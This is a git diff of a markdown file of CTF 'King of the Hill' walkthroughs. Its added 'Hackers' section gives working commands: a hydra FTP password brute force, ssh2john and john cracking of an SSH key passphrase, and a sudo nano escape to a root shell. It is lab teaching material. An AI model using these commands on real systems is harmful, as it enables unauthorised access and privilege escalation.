@@ -1,5 +1,6 @@
 # machine name for KOTH: food(linux)
 First,do a basic nmap scan and then you would find details about the IP address.<br/>
+```
 #### Nmap 7.80 scan initiated Thu Jun 11 15:19:27 2020 as: nmap -sC -sV -oN nmap.txt 10.10.77.101
 Nmap scan report for 10.10.77.101<br/>
 Host is up (0.21s latency).<br/>
@@ -24,6 +25,7 @@ PORT     STATE SERVICE VERSION <br/>
 |     Content-Length: 4 <br/>
 |     Content-Type: text/plain; charset=utf-8 <br/>
 |_    king <br/>
+```
 from the scan we got to know that there is a sql database running on.<br/>
 with the help of command <br/>
 mysql -u root -h ip of machine  -p <br/>
@@ -41,80 +43,6 @@ and change the passwd thats it then just login with root and your password.<br/>
   
  # machine tyler(linux)
 
- #### Nmap 7.80 scan initiated Thu Jun 11 14:19:26 2020 as: nmap -sC -sV -oN nmap.txt 10.10.173.121 <br/>
- <p>
-Nmap scan report for 10.10.173.121<br/>
-Host is up (0.16s latency).<br/>
-Not shown: 991 closed ports<br/>
-PORT     STATE    SERVICE     VERSION <br/>
-22/tcp   open     ssh         OpenSSH 7.4 (protocol 2.0)<br/>
-| ssh-hostkey: <br/>
-|   2048 46:6c:5a:31:5f:c1:1f:f3:65:e7:64:f2:c5:f5:59:d8 (RSA)<br/>
-|   256 5d:a5:8a:af:1e:21:48:7a:04:22:3e:4a:f5:e4:5b:02 (ECDSA)<br/>
-|_  256 6a:44:1c:e1:15:c9:5e:94:da:06:8d:db:d2:bc:66:54 (ED25519)<br/>
-80/tcp   open     http        Apache httpd 2.4.6 ((CentOS) PHP/7.3.16)<br/>
-| http-methods: <br/>
-|_  Potentially risky methods: TRACE <br/>
-|_http-server-header: Apache/2.4.6 (CentOS) PHP/7.3.16 <br/>
-|_http-title: Site doesn't have a title (text/html; charset=UTF-8). <br/>
-139/tcp  open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: SAMBA) <br/>
-445/tcp  open     netbios-ssn Samba smbd 4.9.1 (workgroup: SAMBA) <br/>
-3306/tcp open     mysql       MariaDB (unauthorized) <br/>
-5000/tcp open     http        Werkzeug httpd 1.0.0 (Python 3.6.8) <br/>
-|_http-server-header: Werkzeug/1.0.0 Python/3.6.8 <br/>
-|_http-title: Tyler's file upload <br/>
-8080/tcp open     http        nginx 1.16.1 <br/>
-| http-robots.txt: 1 disallowed entry <br/>
-|_/ <br/>
-|_http-server-header: nginx/1.16.1 <br/>
-| http-title: LibreNMS <br/>
-|_Requested resource was http://10.10.173.121:8080/login <br/>
-|_http-trane-info: Problem with XML parsing of /evox/about <br/>
-8088/tcp filtered radan-http <br/>
-9999/tcp open     abyss? <br/>
-| fingerprint-strings: <br/>
-|   FourOhFourRequest, HTTPOptions: <br/> 
-|     HTTP/1.0 200 OK <br/>
-|     Accept-Ranges: bytes <br/>
-|     Content-Length: 1 <br/>
-|     Content-Type: text/plain; charset=utf-8 <br/>
-|     Last-Modified: Thu, 26 Mar 2020 11:36:37 GMT <br/>
-|     Date: Thu, 11 Jun 2020 08:50:10 GMT <br/>
-|   GenericLines, Help, Kerberos, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: <br/> 
-|     HTTP/1.1 400 Bad Request <br/>
-|     Content-Type: text/plain; charset=utf-8 <br/>
-|     Connection: close <br/>
-|     Request <br/>
-|   GetRequest: <br/>
-|     HTTP/1.0 200 OK <br/>
-|     Accept-Ranges: bytes <br/>
-|     Content-Length: 1 <br/>
-|     Content-Type: text/plain; charset=utf-8 <br/>
-|     Last-Modified: Thu, 26 Mar 2020 11:36:37 GMT <br/>
-|_    Date: Thu, 11 Jun 2020 08:50:09 GMT <br/>
-Host script results: <br/>
-|_clock-skew: mean: 1h20m01s, deviation: 2h18m34s, median: 0s <br/>
-|_nbstat: NetBIOS name: TYLER, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown) <br/>
-| smb-os-discovery: <br/>
-|   OS: Windows 6.1 (Samba 4.9.1) <br/>
-|   Computer name: tyler <br/>
-|   NetBIOS computer name: TYLER\x00 <br/>
-|   Domain name: \x00 <br/>
-|   FQDN: tyler <br/>
-|_  System time: 2020-06-11T04:51:37-04:00 <br/>
-| smb-security-mode: <br/>
-|   account_used: guest <br/>
-|   authentication_level: user <br/>
-|   challenge_response: supported <br/>
-|_  message_signing: disabled (dangerous, but default) <br/>
-| smb2-security-mode: <br/>
-|   2.02: <br/>
-|_    Message signing enabled but not required <br/>
-| smb2-time: <br/>
-|   date: 2020-06-11T08:51:38 <br/>
-|_  start_date: N/A <br/>
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . <br/>
 
 <hr>
 
@@ -127,6 +55,92 @@ here you go, finnaly got your user so the next step is for root.<br/>
 for getting root i used ./linpes.sh script which helped me to find out there is vulnerbility VIM so with help of vim<br/>
 i had added permision for suddorfile letting narrator to get the root shell.<br/>
 once you get the root Just defend your king.txt
+
+# Hackers.
+=> This machine is entairly based on Bruteforce.So comparitively with other machines it takes some time.
+
+1> nmap -sC -p- 10.10.142.184
+
+```
+PORT     STATE SERVICE VERSION
+21/tcp   open  ftp     vsftpd 2.0.8 or later
+22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+80/tcp   open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
+9999/tcp open  abyss?
+```
+2> ftp has an Anonymous login.
+from ftp we will get a note.
+
+which says 
+```
+Note:
+Any users with passwords in this list:
+love
+sex
+god
+secret
+will be subject to an immediate disciplinary hearing.
+Any users with other weak passwords will be complained at, loudly.
+These users are:
+rcampbell:Robert M. Campbell:Weak password
+gcrawford:Gerard B. Crawford:Exposing crypto keys, weak password
+Exposing the company's cryptographic keys is a disciplinary offense.
+Eugene Belford, CSO
+```
+3> bruteforce the password of gcrawford ftp using hydra
+```
+hydra ftp://10.10.142.184 -l gcrawford -P /usr/share/wordlists/rockyou.txt -t 64
+```
+once you get the password login to ftp and you will find out the id_rsa key and business.txt.
+
+4> As id_rsa key is password protected lets use ssh2john and bruteforce the hash you got
+```
+ python3 /usr/share/john/ssh2john.py id_rsa > ssh_hash.txt
+ ```
+ ```
+ john ssh_hash.txt --format=ssh --wordlist=/usr/share/wordlists/rockyou.txt
+ ```
+ 5> once you get the password just login to the ssh connction.
+ ```
+ root@5h4rk:~/koth-hackers# ssh -i id_rsa gcrawford@10.10.142.184
+Unauthorised access is a federal offense under the Computer Fraud and Abuse Act 1986
+Enter passphrase for key 'id_rsa': 
+Last login: Wed Apr 29 19:32:48 2020 from 192.168.170.1
+gcrawford@gibson:~$ whoami
+gcrawford
+gcrawford@gibson:~$ ls
+business.txt
+gcrawford@gibson:~$ ls -lah
+total 40K
+drwxr-x--- 6 gcrawford gcrawford 4.0K Apr 30 04:25 .
+drwxr-xr-x 6 root      root      4.0K Apr 29 22:05 ..
+lrwxrwxrwx 1 gcrawford gcrawford    9 Apr 30 01:31 .bash_history -> /dev/null
+-rw-r--r-- 1 gcrawford gcrawford  220 Apr 29 04:00 .bash_logout
+-rw-r--r-- 1 gcrawford gcrawford 3.7K Apr 29 04:00 .bashrc
+-r-------- 1 gcrawford gcrawford  252 Apr 30 04:25 business.txt
+drwx------ 2 gcrawford gcrawford 4.0K Apr 29 17:05 .cache
+drwx------ 3 gcrawford gcrawford 4.0K Apr 29 17:05 .gnupg
+drwxrwxr-x 3 gcrawford gcrawford 4.0K Apr 29 20:53 .local
+-rw-r--r-- 1 gcrawford gcrawford  807 Apr 29 04:00 .profile
+drwx------ 2 gcrawford gcrawford 4.0K May  9 21:10 .ssh
+gcrawford@gibson:~$ sudo -l
+[sudo] password for gcrawford:        
+Matching Defaults entries for gcrawford on gibson:
+    env_reset, pwfeedback, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User gcrawford may run the following commands on gibson:
+    (root) /bin/nano /home/gcrawford/business.txt
+    ```
+
+6> Time to root the machine! 
+as we can see that we can run nano as root. from gtfobins there is cheat code:-
+use:-
+```
+sudo nano
+^R^X
+reset; sh 1>&0 2>&0
+```
+finally rooted the machine!
 
 
 
